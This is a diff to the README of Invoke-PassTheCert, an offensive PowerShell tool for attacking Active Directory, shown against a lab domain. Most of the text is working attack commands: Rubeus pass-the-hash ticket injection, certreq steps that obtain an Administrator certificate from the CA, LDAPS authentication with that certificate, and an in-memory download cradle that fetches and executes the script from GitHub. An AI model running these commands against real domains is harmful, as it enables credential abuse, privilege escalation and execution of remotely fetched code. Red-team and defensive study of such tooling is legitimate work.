@@ -69,20 +69,45 @@ PS > Rubeus.exe createnetonly /program:powershell.exe /show
 PS (createnetonly) > Rubeus.exe asktgt /nowrap /domain:'<domain>' /dc:<dc_ip> /user:'<computer>$' /rc4:'<nthash>' /ptt
 ```
 
-#### Open the MMC, Add the `Certificates` Snap-in, and connect to a domain's computer
+#### Download the CA's certificate locally
+
+- Using [AD Modules](https://learn.microsoft.com/en-us/powershell/module/activedirectory/) through [RSAT](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools):
+
+```powershell
+PS (runas/createnetonly) > Get-ADObject -Server ADLAB.LOCAL -Filter 'objectClass -eq "certificationAuthority"' -SearchBase "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=ADLAB,DC=LOCAL" -Properties cACertificate |%{ Set-Content -Path ".\$($_.Name).cer" -Value $_.cACertificate[0] -Encoding Byte }
+```
+
+- Using MMC (requires admin on the targeted computer):
 
 > If the  network interface of the domain's computer has the `File and Printer Sharing for Microsoft Networks` item unchecked, the MMC won't be able to connect to the domain, erroring-out `The domain ADLAB.LOCAL could not be found because: The RPC server is unavailable`.
 
 > This step is optional if the CA Issuer's certificate has already been trusted locally (e.g. installed into your local Microsoft Certificate Store).
 
 ```
-PS (runas) > mmc.exe /server:<dc_ip>
-GUI > CTRL+M (i.e. File > Add/Remove Snap-in) > Certificates > Computer Account > Another computer > DC02 > Check Names
+PS (runas/createnetonly) > mmc.exe /server:<dc_ip>
+
+GUI > CTRL+M (i.e. File > Add/Remove Snap-in) 
+    > Certificates 
+    > Computer Account 
+    > Another computer 
+    > DC02 
+    > Check Names
+
 GUI > Certificates (\\DC02) > \\DC02\Personal > Find Certificates...
     Find in: \\DC02\Personal
     Contains: -
-    ADLAB-DC02-CA > Export > DER encoded binary X.509 (.CER)
-    ADLAB-DC02-CA.cer > Install Certificate... > Current User & Local Machine > Automatically select the certificate store based on the type of certificate
+    ADLAB-DC02-CA 
+        > Export 
+        > DER encoded binary X.509 (.CER)
+```
+
+#### Install the CA's certificate to trust it locally
+
+```
+ADLAB-DC02-CA.cer 
+    > Install Certificate... 
+    > Current User & Local Machine 
+    > Automatically select the certificate store based on the type of certificate
 ```
 
 #### Based on the provided `*.inf` file, create a request file, then request a certificate in the PowerShell session running as the domain principal
@@ -107,16 +132,16 @@ PS (runas) > certreq -f -submit -config "192.168.56.202\ADLAB-DC02-CA" Administr
 
 ```powershell
 PS > certreq -f -new SRV01.inf SRV01.req
-Template not found.  Do you wish to continue anyway?
-Machine
-CertReq: Request Created
+    Template not found.  Do you wish to continue anyway?
+    Machine
+    CertReq: Request Created
 ```
 
 ```powershell
 PS (createnetonly) > certreq -f -submit -config "DC02.ADLAB.LOCAL\ADLAB-DC02-CA" SRV01.req SRV01.cer
-RequestId: 71
-RequestId: "71"
-Certificate retrieved(Issued) Issued
+    RequestId: 71
+    RequestId: "71"
+    Certificate retrieved(Issued) Issued
 ```
 
 > As we're dealing with Kerberos tickets, notice that we MUST use an FQDN in the latest command above (`DC02.ADLAB.LOCAL\` here, instead of `192.168.56.202\`).
@@ -178,7 +203,14 @@ Now, we may grab an LDAP Connection Instance, authenticating against an LDAP/S S
 ```powershell
 PS > powershell.exe
 PS > Import-Module .\Invoke-PassTheCert.ps1
-PS > $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Port 636 -Certificate 'Administrator.pfx'
+PS > $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Port 636 -Certificate '.\Administrator.pfx'
+```
+
+> Also, the script MAY be loaded in memory as follows (PowerShell Download Cradle):
+
+```powershell
+PS > iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jamarir/Invoke-PassTheCert/main/Invoke-PassTheCert.ps1')
+PS > Invoke-PassTheCert -?
 ```
 
 > As a side note, we may even export that LDAP/S Connection Instance into a passwordless/password-protected certificate file; for instance:
@@ -190,19 +222,13 @@ PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $Ldap
 PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'
 ```
 
-> Also, the script MAY be loaded in memory as follows (PowerShell Download Cradle):
-
-```powershell
-PS > iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jamarir/Invoke-PassTheCert/main/Invoke-PassTheCert.ps1')
-PS > Invoke-PassTheCert -?
-```
-
 Last, but definitely not least, Read The Funny Manual !
 
 ```powershell
 PS > pwsh
 PS > Import-Module .\Invoke-PassTheCert.ps1
 PS > .\Invoke-PassTheCert.ps1 -?
+PS > Invoke-PassTheCert -?
 ```
 
 ## Available Actions
